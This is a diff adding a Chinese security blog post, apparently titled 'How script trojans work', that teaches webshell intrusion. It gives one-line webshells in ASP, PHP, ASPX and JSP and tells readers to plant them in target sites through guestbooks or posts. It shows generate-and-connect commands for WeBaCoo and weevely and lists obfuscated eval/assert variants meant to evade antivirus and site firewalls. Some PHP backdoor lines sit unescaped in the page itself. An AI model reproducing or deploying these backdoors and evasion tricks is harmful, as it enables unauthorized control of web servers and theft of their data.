@@ -1,0 +1,314 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>脚本木马工作的原理 | pony686</title>
+<link rel="shortcut icon" href="https://itxz.fun/favicon.ico?v=1601777037443">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://itxz.fun/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="脚本木马工作的原理 | pony686 - Atom Feed" href="https://itxz.fun/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="xx.com /dama.asp
+只是对网站有权限修改
+iis网络服务用户
+webshell取决于容器间运行的权限 IIS 网络用户
+apache apache用户
+提权 system
+免杀问题
+safedog
+d盾
+云锁
+360
+阿里云防..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://itxz.fun">
+  <img class="avatar" src="https://itxz.fun/images/avatar.png?v=1601777037443" alt="">
+  </a>
+  <h1 class="site-title">
+    pony686
+  </h1>
+  <p class="site-description">
+    pony686
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          python
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://itxz.fun" class="menu" target="_blank">
+          web安全
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              脚本木马工作的原理
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-13
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>xx.com /dama.asp</p>
+<p>只是对网站有权限修改<br>
+iis网络服务用户</p>
+<p>webshell取决于容器间运行的权限 IIS 网络用户<br>
+apache apache用户<br>
+提权 system</p>
+<p>免杀问题</p>
+<p>safedog<br>
+d盾<br>
+云锁<br>
+360<br>
+阿里云防护<br>
+bypass<br>
+免杀<br>
+www.cracer.com/x.txt<br>
+a.php<br>
+&lt;% execute request(&quot;valuer&quot;)%&gt;</p>
+<p>x.asp<br>
+x.php<br>
+x.jpg</p>
+<p>webshell的种类<br>
+一句话木马<br>
+小马<br>
+大马<br>
+打包马<br>
+脱裤马<br>
+等等<br>
+PART 2:  WEBSHELL 工作原理</p>
+<p>介绍：<br>
+一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>
+<p>&lt;%execute request(&quot;value&quot;)%&gt;<br>
+x.asp</p>
+<p>iis容器（asp/aspx/php）<br>
+cracer.com/x.php<br>
+如容器支持其他脚本类型，可以上传其他脚本木马<br>
+apache/nginx<br>
+php<br>
+asp</p>
+<p>asp/aspx</p>
+<p>iis容器 asp 脚本权限和aspx脚本权限一样吗<br>
+aspx高一些<br>
+调用cms aspx 马可以调用系统cmd<br>
+jsp/tomcat/jboss weblogic administrator system root<br>
+直接提权<br>
+存在降权 public 网络服务用户</p>
+<p>多级包含<br>
+a.asp  b.asp</p>
+<p>工作原理<br>
+黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>
+&lt;%execute request(&quot;value&quot;)%&gt;<br>
+其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>
+&lt;%eval request(&quot;value&quot;)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>
+当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(&quot;value&quot;)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>
+这就被称为一句话木马，它是基于B/S结构的。</p>
+<p>常见写法<br>
+asp一句话木马：<br>
+&lt;%eval request(&quot;c&quot;)%&gt;<br>
+php一句话木马：</p>
+<?php @eval($_POST[value]);?>
+<p>aspx一句话木马：<br>
+&lt;%@ Page Language=&quot;Jscript&quot;%&gt;<br>
+&lt;%eval(Request.Item[&quot;value&quot;])%&gt;<br>
+jsp一句话<br>
+&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;<br>
+一句话的使用<br>
+首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>
+记住!我们的目的是把一句话&lt;%execute request(&quot;value&quot;)%&gt;添加到数据库,无论任何方式!<br>
+然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p>
+<p>小马<br>
+小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传等功能。<br>
+主要用来上传大马</p>
+<p>大马<br>
+大马体积比较大  一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序<br>
+大马的使用<br>
+用途：<br>
+提权<br>
+打包<br>
+脱裤<br>
+增删文件<br>
+等等<br>
+PART 3:  一句话常见的客户端<br>
+一句话最常用的客户端为：<br>
+一句话客户端增强版<br>
+中国菜刀<br>
+中国砍刀<br>
+lanker一句话客户端<br>
+ZV新型PHP一句话木马客户端GUI版<br>
+webacoo<br>
+weveely<br>
+msf 生成的aspx、asp、php、jsp、各种payload<br>
+WeBaCoo (Web Backdoor Cookie) script-kit是一个小巧的、隐蔽的php后门，它提供了一个可以连接远程web服务器并执行php代码的终端。WeBaCoo使用HTTP响应头传送命令结果，shell命令经base64编码后隐藏在Cookie头中。</p>
+<p>生成模式<br>
+-h  查看帮助<br>
+-g   生成shell文件<br>
+终端模式<br>
+启动<br>
+webacoo -h  查看帮助<br>
+生成后门</p>
+<p>生成后门<br>
+webacoo -g -o test.php<br>
+连接<br>
+webacoo -t -u http://127.0.0.1/test.php<br>
+load  加载组建<br>
+unload 退出<br>
+Whoami 执行系统命令<br>
+Exit  退出<br>
+通过代理访问<br>
+webacoo -t -p 127.0.0.1:8080 –uhttp://127.0.0.1/test.php</p>
+<p>weevely<br>
+高隐蔽性的针对php平台的webshell工具<br>
+本身提供了30多种自动化扫描工具<br>
+可以执行多种任务<br>
+浏览文件系统，检测服务器设置，创建tcpshell和reverse shell,在<br>
+被测主机上安装http代理，执行端口扫描</p>
+<p>用法<br>
+weevely  --help<br>
+生成shell<br>
+weevely generate 123123 shell.php<br>
+连接 shell<br>
+weevelly  htpp://127.0.0.1/shell.php  123123<br>
+net.scan 127.0.0.1 20,22,23,8080,3389    扫描指定ip端口</p>
+<p>PART 4:  WEBSHELL 免杀技巧<br>
+使用技巧<br>
+内容编码<br>
+制作图片马<br>
+配合解析漏洞<br>
+配合文件包含</p>
+<p>内容编码</p>
+<?php $_REQUEST['a']($_REQUEST['b']); ?>
+<p>&lt;%Eval(Request(chr(112)))%&gt;<br>
+&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;<br>
+&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;<br>
+&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;</p>
+<?php ($_=@$_GET[2]).@$_($_POST[sz])?>
+<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?>
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);?>
+<?php $a = "a"."s"."s"."e"."r"."t";  $a($_POST["sz"]); ?>
+<p>在菜刀里写http://localhost:8081/test/a.php?2=assert密码是sz</p>
+<p>404隐藏后门</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://itxz.fun/post/sqlmap-gong-ju-de-shi-yong/">
+              <h3 class="post-title">
+                sqlmap工具的使用
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://itxz.fun/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
